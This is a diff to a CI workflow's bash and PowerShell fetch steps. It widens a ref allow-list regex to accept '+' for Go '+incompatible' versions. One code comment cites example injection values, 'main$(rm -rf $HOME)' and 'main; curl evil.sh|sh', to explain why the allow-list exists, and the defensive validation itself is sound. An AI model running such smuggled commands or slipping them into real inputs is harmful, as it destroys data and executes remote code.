@@ -120,22 +120,24 @@ runs:
         # authoritative fetch is (3), which propagates any real error.
         FETCHED=0
         # safe_ref_re — accept only the character set legal for git
-        # branch names and Go pseudo-versions. The ref is derived from
-        # untrusted input (PR body, branch name), and although `go get`
-        # itself rejects shell metacharacters in the URL fragment the
-        # surrounding bash command still treats `${ref}` as a string
-        # to be interpolated; a value like "main$(rm -rf $HOME)" or
-        # "main; curl evil.sh|sh" would expand under the workflow's
-        # default IFS handling. Reject anything outside the allow-list
-        # before we let the value reach `go get`.
-        safe_ref_re='^[A-Za-z0-9._/-]+$'
+        # branch names, tags, commits, and Go module versions. The ref
+        # is derived from untrusted input (PR body, branch name), and
+        # although `go get` itself rejects shell metacharacters in the
+        # URL fragment the surrounding bash command still treats
+        # `${ref}` as a string to be interpolated; a value like
+        # "main$(rm -rf $HOME)" or "main; curl evil.sh|sh" would
+        # expand under the workflow's default IFS handling. Reject
+        # anything outside the allow-list before we let the value
+        # reach `go get`. The `+` is included so `+incompatible` Go
+        # module pseudo-versions (e.g. `v3.5.3+incompatible`) pass.
+        safe_ref_re='^[A-Za-z0-9._/+-]+$'
         try_fetch() {
           local ref="$1"
           local source="$2"
           [ -z "$ref" ] && return 1
           [ "$ref" = "$INTEGRATION_REF" ] && return 1  # skip duplicate fetch
           if ! [[ "$ref" =~ $safe_ref_re ]]; then
-            echo "  ✗ rejecting ref \"$ref\" (from $source): contains characters outside [A-Za-z0-9._/-]"
+            echo "  ✗ rejecting ref \"$ref\" (from $source): contains characters outside [A-Za-z0-9._/+-]; use a valid branch, tag, commit, or Go module version"
             return 1
           fi
           echo "Trying integrations@${ref} (from ${source})"
@@ -176,7 +178,7 @@ runs:
         # execution either.
         if [ "$FETCHED" != "1" ]; then
           if ! [[ "$INTEGRATION_REF" =~ $safe_ref_re ]]; then
-            echo "::error::INTEGRATION_REF \"$INTEGRATION_REF\" contains characters outside [A-Za-z0-9._/-]; refusing to fetch"
+            echo "::error::INTEGRATION_REF \"$INTEGRATION_REF\" contains characters outside [A-Za-z0-9._/+-]; refusing to fetch"
             exit 1
           fi
           echo "Fetching private integrations dependency via SSH (INTEGRATION_REF=${INTEGRATION_REF})..."
@@ -216,16 +218,18 @@ runs:
         $env:GOPRIVATE = "github.com/keploy/integrations"
         $Fetched = $false
         # Same allow-list as the bash step: refuse refs containing
-        # anything outside the git-branch / Go-pseudo-version legal
+        # anything outside the git-branch / Go module version legal
         # set so a malicious PR body can't smuggle pwsh metacharacters
-        # into the `go get` invocation.
-        $SafeRefRe = '^[A-Za-z0-9._/-]+$'
+        # into the `go get` invocation. The `+` is included so
+        # `+incompatible` Go module pseudo-versions (e.g.
+        # `v3.5.3+incompatible`) pass on Windows just like on Linux.
+        $SafeRefRe = '^[A-Za-z0-9._/+-]+$'
 
         function Try-Fetch([string]$Ref, [string]$Source) {
           if ([string]::IsNullOrWhiteSpace($Ref)) { return $false }
           if ($Ref -eq $env:INTEGRATION_REF) { return $false }
           if ($Ref -notmatch $SafeRefRe) {
-            Write-Host "  rejecting ref '$Ref' (from $Source): contains characters outside [A-Za-z0-9._/-]"
+            Write-Host "  rejecting ref '$Ref' (from $Source): contains characters outside [A-Za-z0-9._/+-]; use a valid branch, tag, commit, or Go module version"
             return $false
           }
           Write-Host "Trying integrations@$Ref (from $Source)"
@@ -265,7 +269,7 @@ runs:
 
         if (-not $Fetched) {
           if ($env:INTEGRATION_REF -notmatch $SafeRefRe) {
-            Write-Host "::error::INTEGRATION_REF '$env:INTEGRATION_REF' contains characters outside [A-Za-z0-9._/-]; refusing to fetch"
+            Write-Host "::error::INTEGRATION_REF '$env:INTEGRATION_REF' contains characters outside [A-Za-z0-9._/+-]; refusing to fetch"
             exit 1
           }
           Write-Host "Fetching private integrations dependency via SSH (INTEGRATION_REF=$env:INTEGRATION_REF)..."
